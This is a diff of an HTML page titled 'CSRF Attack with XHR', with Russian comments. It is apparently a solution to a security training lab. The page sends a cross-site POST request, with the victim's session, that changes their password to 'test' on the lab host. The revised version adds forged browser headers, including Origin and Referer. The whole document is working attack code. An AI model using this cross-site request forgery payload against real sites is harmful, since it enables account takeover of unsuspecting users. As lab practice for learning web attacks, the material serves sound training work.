@@ -1,10 +1,37 @@
+<!DOCTYPE html>
 <html>
-<script>
-var xmlHttp = new XMLHttpRequest();
-xmlHttp.open("POST", "https://web.wrzn11se9ah2h9obfbpi.labs.cyber-ed.space/main.php", true);
-xmlHttp.withCredentials=true;
-xmlHttp.setRequestHeader("Content-type",
-"application/x-www-form-urlencoded");
-xmlHttp.send("action=change_password&new_password=test");
-</script>
+<head>
+    <title>CSRF Attack with XHR</title>
+</head>
+<body>
+    <script>
+        // Создаем новый объект XMLHttpRequest
+        var xhr = new XMLHttpRequest();
+
+        // Устанавливаем метод и URL для запроса
+        xhr.open("POST", "https://web.wrzn11se9ah2h9obfbpi.labs.cyber-ed.space/main.php", true);
+
+        // Устанавливаем заголовки запроса
+        xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0");
+        xhr.setRequestHeader("Accept", "*/*");
+        xhr.setRequestHeader("Accept-Language", "ru,en-US;q=0.7,en;q=0.3");
+        xhr.setRequestHeader("Accept-Encoding", "gzip, deflate, br");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.setRequestHeader("Origin", "https://bimbombonjoli.github.io");
+        xhr.setRequestHeader("Referer", "https://bimbombonjoli.github.io/");
+        xhr.setRequestHeader("Sec-Fetch-Dest", "empty");
+        xhr.setRequestHeader("Sec-Fetch-Mode", "cors");
+        xhr.setRequestHeader("Sec-Fetch-Site", "cross-site");
+        xhr.setRequestHeader("Te", "trailers");
+
+        // Устанавливаем данные для отправки
+        var data = "action=change_password&new_password=test";
+
+        // Устанавливаем длину данных
+        xhr.setRequestHeader("Content-Length", data.length);
+
+        // Отправляем запрос
+        xhr.send(data);
+    </script>
+</body>
 </html>
